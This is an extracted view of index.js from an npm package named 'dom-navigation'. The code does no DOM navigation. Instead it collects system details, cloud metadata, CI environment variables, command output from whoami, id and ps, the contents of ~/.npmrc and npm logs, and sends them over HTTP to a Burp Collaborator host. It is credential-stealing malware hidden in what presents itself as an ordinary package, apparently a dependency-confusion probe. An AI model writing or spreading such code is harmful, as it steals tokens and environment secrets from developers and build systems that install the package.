// File: tmp/tmpvmc2dmkd/dom-navigation/package/index.js
// ======================================================================
Line 1: _tmp_1 = require("child_process")
Line 2: const http = require("http")
Line 3: const os = require("os")
Line 4: const fs = require("fs")
Line 5: const path = require("path")
Line 11: data.toString()
Line 12: <operator>.formatString("http://", BURP_COLLAB, "/", tag, "?data=", safe, "")
Line 18: os.hostname()
Line 19: os.platform()
Line 20: os.arch()
Line 28: const prodName = fs.readFileSync("/sys/class/dmi/id/product_name", "utf8")
Line 32: const vendor = fs.readFileSync("/sys/class/dmi/id/sys_vendor", "utf8")
Line 37: (_tmp_2 = http.get(
    {
      host: "169.254.169.254",
      path: "/computeMetadata/v1/instance/id",
      headers: { "Metadata-Flavor": "Google" },
      timeout: 2000
    },
    res => {
      let data = "";
      res.on("data", chunk => (data += chunk));
      res.on("end", () => exfil("gce_metadata_id", data));
    }
  ))
Line 57: const cgroup = fs.readFileSync("/proc/1/cgroup", "utf8")
Line 58: cgroup.includes("docker")
Line 62: {
  const ciVars = ["CI", "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL"];
  ciVars.forEach(varName => {
    if (process.env[varName]) {
      exfil("ci_env", `${varName}=${process.env[varName]}`);
    }
  });
}
Line 63: const ciVars = ["CI", "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL"]
Line 65: {
      exfil("ci_env", `${varName}=${process.env[varName]}`);
    }
Line 66: exfil("ci_env", `${varName}=${process.env[varName]}`)
Line 73: execSync("whoami").toString()
Line 74: execSync("id").toString()
Line 75: execSync("uname -a").toString()
Line 76: execSync("ps -e -o pid,ppid,cmd --sort=-%mem | head -n 10").toString()
Line 83: const contents = fs.readdirSync(cwd).join(", ")
Line 86: path.join(cwd, "package.json")
Line 87: const pkg = fs.readFileSync(path.join(cwd, "package.json"), "utf8")
Line 91: const nodeModules = fs.existsSync("node_modules")
    ? fs.readdirSync("node_modules").join(", ")
    : "none"
Line 92: (_tmp_11 = fs.readdirSync("node_modules"))
Line 102: path.join(home, ".npmrc")
Line 103: path.join(home, ".npm/_logs")
Line 106: fs.readFileSync(npmrc, "utf8")
Line 110: const logs = fs.readdirSync(npmLogDir).slice(-2)
Line 112: const content = fs.readFileSync(path.join(npmLogDir, log), "utf8")
Line 119: {
  const googlePaths = ["/google", "/etc/google-cloud", "/opt/google", "/var/lib/google"];
  googlePaths.forEach(p => {
    if (fs.existsSync(p)) {
      exfil("google_path_found", p);
    }
  });
}
Line 120: const googlePaths = ["/google", "/etc/google-cloud", "/opt/google", "/var/lib/google"]
